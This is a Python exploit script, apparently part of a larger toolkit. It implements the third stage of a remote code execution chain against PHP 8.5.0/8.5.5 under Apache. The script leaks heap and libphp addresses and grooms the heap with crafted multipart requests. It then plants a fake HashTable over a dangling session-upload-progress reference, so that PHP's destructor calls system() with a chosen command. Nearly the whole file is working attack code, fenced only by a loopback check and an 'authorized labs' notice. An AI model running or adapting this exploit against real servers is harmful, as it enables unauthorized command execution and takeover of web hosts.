#!/usr/bin/env python3
"""php2shell_vessel.py — stage-3 "vessel" variant for early-8.5 layouts.

Why a second stage 3
--------------------
Upstream's stage 3 lands a 15-byte bin-40 carrier string exactly on the
dangling PS(http_session_vars) reference (R0). On the official php:8.5.0 and
php:8.5.5 images that layout is unreachable: request machinery carves the
bin-3 (32 B) page at 0x68 before any of our fields are parsed, so B2's 15
fake-HashTable blobs (167-byte values -> bin 13/192 B) start one page later
at 0x69, while R0 still sits on 0x68. No carrier allocation reaches it.

The vessel variant
------------------
Two changes realign the pages:

* S (prime) grows an "early" field whose 160-byte value lands in bin 13. One
  bin-13 allocation consumes a whole 4 KiB page, pushing S's first bin-3
  carve - the page holding the dangling reference - one page up:
  R0(m) = 0x69000 + 0x160 + 0x80*m (m = 3 with three 7:7 pads).
* B2 drops the separate carrier string and the short-named filler fields.
  Every name and value is >= 8 bytes, so B2 itself allocates no bin-3 slot
  and its blob run starts at page 0x69: blob 0's data lands at chunk+0x690D8
  (the fake HashTable + execute_data + cmd string), blob 1 - the "vessel" -
  at chunk+0x69258, its bytes sitting exactly at R0(m=3) = 0x692E0.

The vessel is byte-identical to the canonical blob except that the 15-byte
reference pattern (gc rc=1 IS_REFERENCE + the low 7 bytes of htdata) is
grafted at offset 0x88, over the fake cmd string's h and len fields - both
unread on the fire path - followed by a NUL and val.u1 type_info 0x0307
(type IS_REFERENCE, type_flags != 0 so Z_REFCOUNTED_P passes). At session
close, zend_reference_destroy -> i_zval_ptr_dtor reads the vessel as the
stale reference, DELREFs val.value (= blob 0's data, the fake HashTable),
and the destructor chain fires zif_system with blob 0's cmd string.

Verified (uid=33 www-data proof) on php:8.5.0-apache and php:8.5.5-apache
labs, under gdb and without it. Authorized local labs only.
"""

from __future__ import annotations

import argparse
import os
import re
import struct
import sys
import time
import urllib.parse

from php2shell_paths import default_repo_dir
from php2shell_rce import is_loopback
from php2shell_upstream import patch_cookie_decode, patch_params, patch_tls

DEFAULT_DIR = default_repo_dir()

# Winning 8.5.0/8.5.5 geometry; every value is overridable.
DEFAULTS = {
    "early": 160,           # bytes of the S-side page-shifter field value
    "pads": [(7, 7)] * 3,   # S pads; m=3 puts R0 on the vessel pattern
    "blobs": 15,            # B2 fake-HashTable blobs (bin-13 slots)
    "vessel_index": 1,      # blob that carries the embedded ref pattern
}
DEFAULT_HTDATA = 0x690D8    # chunk-relative data offset of blob 0
MAX_CMD = 14                # fake string payload room inside the 167 bytes


def parse_pads(spec: str):
    """'31:31x6,7:7x3' -> [(31, 31)] * 6 + [(7, 7)] * 3; 'none' -> []."""
    if spec in ("none", "", "0x0"):
        return []
    pads = []
    for group in spec.split(","):
        m = re.fullmatch(r"(\d+):(\d+)x(\d+)", group)
        if not m:
            raise argparse.ArgumentTypeError(
                f"bad pad spec {group!r} (want NL:VLxCOUNT,...)")
        nl, vl, n = (int(g) for g in m.groups())
        pads += [(nl, vl)] * n
    return pads


def pads_to_spec(pads) -> str:
    """[[7,7]] * 3 -> '7:7x3' (consecutive equal pairs grouped)."""
    groups: list[list[int]] = []
    for pair in pads:
        nl, vl = (int(x) for x in pair[:2])
        if groups and groups[-1][:2] == [nl, vl]:
            groups[-1][2] += 1
        else:
            groups.append([nl, vl, 1])
    return ",".join(f"{nl}:{vl}x{n}" for nl, vl, n in groups)


def carrier_pattern(htdata: int) -> bytes:
    """The 15 bytes that must sit at R0: gc(rc=1, IS_REFERENCE) + htdata."""
    return struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]


def prime_parts(mod, ex, early: int, pads) -> list[dict]:
    """Request S: session fields + steering + pads + file + OOM."""
    parts = [{"name": "PHPSESSID", "data": b"a" * 19}]
    if early > 0:
        # bin-13 sized (24 name overhead + N + 1 <= 192): one whole page.
        parts.append({"name": "e0000000", "data": b"E" * early})
    parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3})
    for i, (nl, vl) in enumerate(pads):
        name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
        parts.append({"name": name, "data": b"V" * vl})
    parts += [ex._file_part(), ex._big_field()]
    return parts


def b2_parts(mod, ex, htdata: int, zif: int, blobs: int, vessel_index: int):
    """Request B2: long names only, blob `vessel_index` carries the pattern."""
    ht, _ = ex._fake_payload(htdata, zif)
    # The vessel's own cmd string is corrupted (h/len overwritten), which is
    # fine: the fire path reads blob 0's string via arg1.val = htdata+0x80.
    vessel = bytearray(ht)
    vessel[0x88:0x97] = carrier_pattern(htdata)
    vessel[0x97] = 0
    vessel[0x98:0x9C] = struct.pack("<I", 0x0307)
    parts = [
        {"name": "PHPSESSID", "data": mod.SID},
        # 9 bytes: with "PHP_SESSION_UPLOAD_PROGRESS" every name/value is
        # >= 8 bytes, so B2 allocates no bin-3 slot before the blobs.
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwnpwnpwn"},
    ]
    for i in range(blobs):
        data = bytes(vessel) if i == vessel_index else ht
        parts.append({"name": f"a{i:030d}"[:31], "data": data})
    return parts


def fire(mod, ex, chunk: int, zif: int, htdata_off: int, params: dict | None = None):
    """Prime (S) and fire (B2) the vessel stage 3.

    The caller rotates first: S must be the first heavy request on a fresh
    worker for the deterministic heap layout. Leaks stay valid across the
    rotation because the replacement worker shares the ASLR epoch.
    """
    p = dict(DEFAULTS, **(params or {}))
    p["pads"] = [tuple(x) for x in p["pads"]]
    htdata = chunk + htdata_off
    ex.t.log(f"[*] stage 3 (vessel): HTDATA=0x{htdata:x} ZIF=0x{zif:x} "
             f"early={p['early']} pads={pads_to_spec(p['pads'])} "
             f"blobs={p['blobs']} vessel=a{p['vessel_index']}")
    ex.t.post(mod.build_multipart(
                  prime_parts(mod, ex, p["early"], p["pads"]), b"S" * 17),
              b"S" * 17, read_cap=1 << 20,
              timeout=max(90.0, ex.t.timeout),
              extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
    time.sleep(0.3)
    ex.t.post(mod.build_multipart(
                  b2_parts(mod, ex, htdata, zif, p["blobs"], p["vessel_index"]),
                  b"B" * 10),
              b"B" * 10, read_cap=65536, timeout=30.0)


def main() -> int:
    from php2shell_calibrate import load_upstream

    ap = argparse.ArgumentParser(
        description="Vessel stage-3 chain (early-8.5 heap layouts).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("-u", "--target", required=True,
                    help="target PHP page, e.g. http://127.0.0.1:8127/index.php")
    ap.add_argument("-c", "--command", default="id>/out/p1",
                    help=f"command to execute (max {MAX_CMD} bytes)")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), required=True,
                    help="zif_system offset in libphp.so")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), required=True,
                    help="zval_ptr_dtor offset in libphp.so")
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0),
                    default=DEFAULT_HTDATA,
                    help="chunk-relative offset of blob 0's data")
    ap.add_argument("--stage1-n", type=int, default=841)
    ap.add_argument("--forge-len", type=int, default=63)
    ap.add_argument("--stage2-t", type=int, default=406)
    ap.add_argument("--stage2-v", type=int, default=16)
    ap.add_argument("--early", type=int, default=DEFAULTS["early"],
                    help="bytes of the S-side early steering field")
    ap.add_argument("--pad", type=parse_pads, default=parse_pads("7:7x3"),
                    metavar="NL:VLxCOUNT,...", help="S pads")
    ap.add_argument("--blobs", type=int, default=DEFAULTS["blobs"],
                    help="number of B2 fake-HashTable blobs")
    ap.add_argument("--vessel-index", type=int, default=DEFAULTS["vessel_index"],
                    help="blob index carrying the embedded reference pattern")
    ap.add_argument("--huge-mb", type=int, default=12,
                    help="OOM field size in MiB; must exceed memory_limit")
    ap.add_argument("--proof-file", default=None,
                    help="local file the command writes to; '' disables")
    ap.add_argument("--fetch", default="",
                    help="GET this path afterwards (remote proof)")
    ap.add_argument("--retries", type=int, default=3,
                    help="attempts per leak stage; stage 3 uses retries+3")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--repo-dir", default=DEFAULT_DIR)
    ap.add_argument("--allow-remote", action="store_true",
                    help="allow non-loopback targets (written authorization required)")
    ap.add_argument("--insecure", action="store_true",
                    help="disable TLS certificate verification (lab certs)")
    ap.add_argument("--no-pre-rotate", action="store_true")
    ap.add_argument("--no-retry-rotate", action="store_true")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    if len(args.command.encode()) > MAX_CMD:
        ap.error(f"--command is limited to {MAX_CMD} bytes")

    host = urllib.parse.urlsplit(args.target if "://" in args.target
                                 else "http://" + args.target).hostname or ""
    if not args.allow_remote and not is_loopback(host):
        print(f"[!] {host} is not loopback; use --allow-remote only with "
              "authorization.", file=sys.stderr)
        return 4

    patch_params(args.repo_dir)
    patch_cookie_decode(args.repo_dir)
    if args.insecure:
        patch_tls(args.repo_dir)

    mod = load_upstream(args.repo_dir)
    t = mod.Target(args.target, timeout=args.timeout, verbose=not args.quiet)
    ex = mod.Exploit(t, args.command, zif_offset=args.zif_offset,
                     dtor_offset=args.dtor_offset, huge_mb=args.huge_mb,
                     profile="bookworm", verbose=not args.quiet)
    ex.stage1_n = args.stage1_n
    ex.stage1_forge_len = args.forge_len
    ex.stage2_t = args.stage2_t
    ex.stage2_v = args.stage2_v
    params = {"early": args.early, "pads": args.pad, "blobs": args.blobs,
              "vessel_index": args.vessel_index}

    def rotate_after_failure() -> None:
        if not args.no_retry_rotate:
            ex.rotate()

    if not args.no_pre_rotate:
        ex.rotate()

    # ---- stages 1 and 2: same leaks as upstream ----
    chunk = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] stage 1: heap leak (attempt {attempt}/{args.retries})")
        chunk = ex.stage1()
        if chunk:
            t.log(f"[+] chunk base = 0x{chunk:x}")
            break
        t.log("[-] heap leak missed")
        rotate_after_failure()
    if not chunk:
        print("HEAP_LEAK_FAILED", file=sys.stderr)
        return 1
    ex.rotate()  # each stage needs a fresh worker

    libphp = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] stage 2: libphp leak (attempt {attempt}/{args.retries})")
        libphp = ex.stage2()
        if libphp:
            t.log(f"[+] libphp base = 0x{libphp:x}")
            break
        t.log("[-] libphp leak missed")
        rotate_after_failure()
    if not libphp:
        print("LIBPHP_LEAK_FAILED", file=sys.stderr)
        return 1
    zif = libphp + args.zif_offset
    ex.rotate()  # S must be the first heavy request on the fresh worker

    # ---- stage 3: vessel ----
    proof_path = args.proof_file
    if proof_path:
        try:
            if os.path.exists(proof_path):
                os.unlink(proof_path)
        except OSError:
            pass
    proof = ""
    for attempt in range(1, args.retries + 3):
        try:
            fire(mod, ex, chunk, zif, args.htdata_offset, params)
        except OSError as exc:
            t.log(f"[-] request error: {exc}")
        time.sleep(0.8)
        if proof_path:
            try:
                if os.path.exists(proof_path):
                    with open(proof_path, "rb") as fh:
                        proof = fh.read().decode("latin1").strip()
            except OSError:
                pass
        if not proof and args.fetch:
            status, body = t.get(args.fetch)
            if status == 200:
                proof = body.decode("latin1").strip()
        if proof:
            t.log(f"[+] W3 attempt {attempt} (vessel)")
            print(f"PROOF: {proof}")
            return 0
        t.log(f"[-] stage 3 attempt {attempt} no proof yet")
        rotate_after_failure()

    print("EXPLOIT_FAILED (no proof; the command may still have executed blind)",
          file=sys.stderr)
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
